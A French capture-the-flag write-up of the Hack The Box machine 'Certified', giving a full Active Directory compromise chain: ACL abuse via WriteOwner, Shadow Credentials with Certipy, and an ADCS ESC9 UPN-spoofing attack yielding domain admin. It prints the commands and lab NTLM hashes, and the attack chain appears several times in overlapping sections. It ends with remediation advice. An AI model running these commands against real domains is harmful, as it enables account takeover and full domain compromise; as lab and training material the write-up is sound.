![Cover](cover.png)

### Phase 1 : Reconnaissance & Brèche Initiale

La machine **Certified** adopte un scénario de type **Assume-Breach**. Contrairement aux vecteurs d'entrée classiques via des vulnérabilités web, l'exercice débute avec un accès initial via des identifiants utilisateur compromis : `judith.mader` : `judith09`.

#### 1. Énumération Réseau et Services

Je commence par un scan **Nmap** exhaustif pour identifier la surface d'attaque du **Domain Controller**.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.41

# Scan de services détaillé sur les ports identifiés
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5357,5985,9389 -sCV 10.10.11.41
```

L'analyse des résultats confirme un environnement **Active Directory** standard :
*   **DNS** (53), **Kerberos** (88), **LDAP** (389/636).
*   **SMB** (445) avec signature activée et requise.
*   **WinRM** (5985) pour la gestion à distance.
*   Le **FQDN** identifié est `dc01.certified.htb` au sein du domaine `certified.htb`.

J'ajoute ces entrées à mon fichier `/etc/hosts` :
```text
10.10.11.41 dc01.certified.htb certified.htb
```

#### 2. Validation des Identifiants et Énumération SMB

Je vérifie la validité des credentials fournis via **NetExec** (anciennement CrackMapExec).

```bash
# Vérification SMB
netexec smb certified.htb -u judith.mader -p judith09

# Vérification WinRM
netexec winrm certified.htb -u judith.mader -p judith09
```

Les identifiants sont valides pour **SMB** mais ne permettent pas une connexion directe via **WinRM**. L'énumération des partages SMB ne révèle que les répertoires par défaut (`NETLOGON`, `SYSVOL`), sans fichiers sensibles apparents.

#### 3. Analyse de la structure Active Directory (Bloodhound)

Pour comprendre les relations de confiance et les permissions (ACL), j'utilise **Bloodhound.py** (version Community Edition) afin de collecter les données du domaine.

```bash
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip
```

L'analyse du graphe révèle un chemin d'attaque critique basé sur des mauvaises configurations d'**Object Control** :
1.  `judith.mader` possède le droit **WriteOwner** sur le groupe `Management`.
2.  Le groupe `Management` possède le droit **GenericWrite** sur l'utilisateur `management_svc`.
3.  `management_svc` possède le droit **GenericAll** sur l'utilisateur `ca_operator`.

> **Schéma Mental :**
> L'attaque repose sur une réaction en chaîne d'abus d'ACL (Access Control Lists). En étant **Owner** d'un groupe, je peux modifier ses permissions pour m'octroyer le droit d'y ajouter des membres. Une fois membre du groupe `Management`, j'hérite des droits de **GenericWrite** sur un compte de service, ce qui permet de détourner ce compte via des **Shadow Credentials**.

#### 4. Escalade de Privilèges : Vers le compte Management_SVC

Je procède à l'exploitation de l'ACL **WriteOwner** sur le groupe `Management` pour y injecter mon utilisateur.

**Étape A : Modification de l'Owner du groupe**
J'utilise `owneredit.py` d'**Impacket** pour devenir officiellement propriétaire du groupe.
```bash
owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41
```

**Étape B : Modification des droits (DACL)**
Maintenant propriétaire, je m'accorde le droit `WriteMembers` via `dacledit.py`.
```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41
```

**Étape C : Injection dans le groupe**
J'ajoute `judith.mader` au groupe `Management`.
```bash
net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```

#### 5. Abus des Shadow Credentials et Premier Shell

En tant que membre du groupe `Management`, je dispose du **GenericWrite** sur `management_svc`. Je vais utiliser la technique des **Shadow Credentials** pour obtenir un **TGT** (Ticket Granting Ticket) et extraire le hash NTLM de ce compte sans modifier son mot de passe.

J'utilise **Certipy** pour automatiser l'attaque :
```bash
certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
```

L'outil génère un certificat, l'injecte dans l'attribut `msDS-KeyCredentialLink` de la cible, s'authentifie, et récupère le hash NTLM :
`management_svc` : `a091c1832bcdd4677c28b5a6a1295584`

Je valide l'accès **WinRM** avec ce hash et j'obtiens mon premier shell interactif.

```bash
# Connexion via Evil-WinRM
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

Une fois connecté, je peux lire le premier flag :
```powershell
type C:\Users\management_svc\desktop\user.txt
```

---

### Énumération du Domaine & Analyse BloodHound

Une fois les identifiants de **judith.mader** validés via **SMB**, j'entame une énumération systématique de l'**Active Directory**. L'objectif est d'identifier des chemins de contrôle d'objets (ACL) exploitables.

```bash
# Collecte des données avec BloodHound.py (branche CE)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip

# Vérification des partages SMB
netexec smb dc01.certified.htb -u judith.mader -p judith09 --shares
```

L'analyse dans **BloodHound** révèle une chaîne de compromission critique :
1. **judith.mader** possède le droit **WriteOwner** sur le groupe **Management**.
2. Le groupe **Management** possède le droit **GenericWrite** sur l'utilisateur **management_svc**.
3. **management_svc** possède le droit **GenericAll** sur l'utilisateur **ca_operator**.

> **Schéma Mental :**
> Judith (WriteOwner) ➔ Groupe Management (GenericWrite) ➔ management_svc (GenericAll) ➔ ca_operator.

---

### Mouvement Latéral : De Judith à management_svc

Pour abuser du droit **WriteOwner**, je dois d'abord m'approprier l'objet, puis modifier ses **DACL** pour m'accorder le droit d'ajouter des membres.

```bash
# 1. Devenir propriétaire du groupe Management
owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41

# 2. S'octroyer le droit WriteMembers
dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41

# 3. S'ajouter au groupe Management
net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```

Maintenant que Judith est membre du groupe **Management**, elle hérite du **GenericWrite** sur **management_svc**. J'utilise une attaque de type **Shadow Credentials** pour obtenir le hash NTLM de ce compte sans changer son mot de passe.

```bash
# Attaque Shadow Credentials via Certipy
certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
```

Une fois le hash récupéré, je me connecte via **Evil-WinRM** pour obtenir un shell stable.

---

### Pivot vers ca_operator

L'utilisateur **management_svc** a un contrôle total (**GenericAll**) sur **ca_operator**. Je réitère l'attaque **Shadow Credentials** pour pivoter vers ce nouvel utilisateur, qui semble lié à la gestion de l'**ADCS** (Active Directory Certificate Services).

```bash
# Récupération du hash NTLM de ca_operator
certipy shadow auto -username management_svc@certified.htb -hashes :[HASH_NTLM] -account ca_operator -target certified.htb -dc-ip 10.10.11.41

# Vérification des privilèges ADCS pour ca_operator
certipy find -vulnerable -u ca_operator -hashes :[HASH_NTLM] -dc-ip 10.10.11.41 -stdout
```

---

### Escalade de Privilèges : Abus de l'ESC9 (ADCS)

L'énumération **ADCS** révèle un **Certificate Template** nommé `CertifiedAuthentication` vulnérable à l'attaque **ESC9**. Cette vulnérabilité survient lorsque le flag `CT_FLAG_NO_SECURITY_EXTENSION` est présent, empêchant l'inclusion de l'extension de sécurité qui lie le certificat à un **Object SID**.

> **Schéma Mental (ESC9) :**
> management_svc modifie l'UPN de ca_operator ➔ UPN devient "Administrator" ➔ ca_operator demande un certificat ➔ Le CA délivre un certificat au nom de "Administrator" sans vérification de SID ➔ Authentification en tant que Domain Admin.

#### 1. Modification de l'User Principal Name (UPN)
J'utilise les droits de **management_svc** pour changer l'**UPN** de **ca_operator** en `Administrator`.

```bash
certipy account update -u management_svc -hashes :[HASH_NTLM] -user ca_operator -upn Administrator -dc-ip 10.10.11.41
```

#### 2. Demande et Authentification du Certificat
En tant que **ca_operator**, je demande un certificat basé sur le template vulnérable. Le serveur délivre un certificat dont l'identité est simplement `Administrator`.

```bash
# Requête du certificat
certipy req -u ca_operator -hashes :[HASH_NTLM] -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41

# Restauration immédiate de l'UPN (Post-Exploitation / Stabilité)
certipy account update -u management_svc -hashes :[HASH_NTLM] -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41

# Authentification via le certificat pour obtenir le hash NTLM de l'Administrateur
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
```

#### 3. Accès final (Domain Admin)
Avec le hash NTLM de l'administrateur du domaine, je finalise la compromission de la machine.

```bash
evil-winrm -i certified.htb -u administrator -H [ADMIN_NTLM_HASH]
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l'accès établi en tant que **management_svc**, l'objectif est d'atteindre le privilège maximal. L'analyse de l'**Active Directory** révèle que cet utilisateur possède le droit **GenericAll** sur l'utilisateur **ca_operator**, qui lui-même dispose de droits spécifiques sur les services de certificats (**ADCS**).

#### 1. Compromission de ca_operator via Shadow Credentials

Puisque je dispose du contrôle total (**GenericAll**) sur l'objet **ca_operator**, je peux manipuler son attribut `msDS-KeyCredentialLink` pour effectuer une attaque par **Shadow Credentials**. Cela me permet d'obtenir un **TGT** (Ticket Granting Ticket) et d'extraire le hash **NTLM** de l'utilisateur sans changer son mot de passe.

```bash
# Ajout d'un Shadow Credential pour ca_operator
certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
```

Le hash récupéré pour **ca_operator** est : `b4b86f45c6018f1b664f70805f45d8f2`. Bien que ce compte n'ait pas d'accès **WinRM**, il est crucial pour l'étape suivante impliquant **ADCS**.

#### 2. Analyse de la vulnérabilité ADCS ESC9

En énumérant les templates de certificats avec les privilèges de **ca_operator**, j'identifie un vecteur critique : le template **CertifiedAuthentication**.

```bash
# Énumération des templates vulnérables
certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout
```

Le template présente une vulnérabilité **ESC9**. Cette configuration est exploitable car :
1. Le groupe `operator ca` (dont fait partie **ca_operator**) possède les droits d'enrôlement (**Enrollment Rights**).
2. Le flag `msPKI-Enrollment-Flag` contient `CT_FLAG_NO_SECURITY_EXTENSION`, ce qui signifie que le certificat ne contiendra pas d'extension de sécurité liant l'identité de manière forte (pas de **SID** inclus).
3. L'utilisateur a le droit de modifier son propre **User Principal Name (UPN)** ou celui d'un compte sur lequel il a un contrôle d'objet.

> **Schéma Mental : Logique de l'attaque ESC9**
> `management_svc` (GenericAll) -> `ca_operator` (UPN modifié en "Administrator") -> Requête de certificat -> Le CA délivre un certificat au nom de "Administrator" sans vérification de SID -> Authentification en tant que Domain Admin.

#### 3. Exploitation finale : Impersonation de l'Administrator

Pour exploiter **ESC9**, je vais modifier l'**UPN** de **ca_operator** pour qu'il corresponde exactement à `Administrator`. Contrairement à une usurpation classique, je ne mets pas le suffixe `@certified.htb` pour éviter les conflits immédiats, car Windows résoudra l'identité localement lors de l'authentification par certificat.

```bash
# Étape A : Modifier l'UPN de ca_operator vers Administrator
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41

# Étape B : Demander un certificat basé sur le template vulnérable
certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41

# Étape C : Restaurer l'UPN original (Post-Exploitation Cleanup)
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41
```

Une fois le fichier `administrator.pfx` obtenu, je l'utilise pour m'authentifier auprès du **KDC** et récupérer le hash **NTLM** du véritable compte **Administrator**.

```bash
# Authentification via certificat pour obtenir le hash NT de l'admin
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
```

Le hash final est : `0d5b49608bbce1751f708748f67e2d34`. Je termine la compromission via **Evil-WinRM**.

```bash
# Accès final Root
evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```

---

### Analyse "Beyond Root"

La compromission de **Certified** illustre parfaitement la dangerosité des configurations **ADCS** modernes combinées à une gestion permissive des ACL d'objets.

1.  **Faiblesse de l'implication UPN** : L'attaque **ESC9** repose sur le fait que l'identité dans le certificat est basée uniquement sur l'**UPN**. Si le flag `CT_FLAG_NO_SECURITY_EXTENSION` est présent, le contrôleur de domaine ne vérifie pas si le **SID** de l'objet correspond à l'identité revendiquée. C'est une faille de conception dans la manière dont Windows mappe les certificats aux comptes utilisateurs lorsque les protections de "Strong Mapping" ne sont pas au niveau 2 (Enforced).
2.  **Chaîne de contrôle d'objets** : La progression `judith.mader` -> `Management Group` -> `management_svc` -> `ca_operator` montre qu'un attaquant ne cherche pas forcément des vulnérabilités logicielles, mais des **Pathways** de droits. Le droit **WriteOwner** initial sur un groupe a permis de réécrire la structure de sécurité de toute la chaîne.
3.  **Shadow Credentials comme vecteur pivot** : L'utilisation systématique de `msDS-KeyCredentialLink` remplace avantageusement le changement de mot de passe, rendant l'attaque plus discrète et évitant de casser les services légitimes qui utiliseraient ces comptes.
4.  **Remédiation** : Pour contrer ce vecteur, il est impératif d'activer le **Strong Certificate Binding** (KB5014754) et de s'assurer qu'aucun template ne possède le flag `msPKI-Enrollment-Flag: 0x00000001` (No Security Extension) tout en permettant aux utilisateurs de modifier leur propre **UPN**.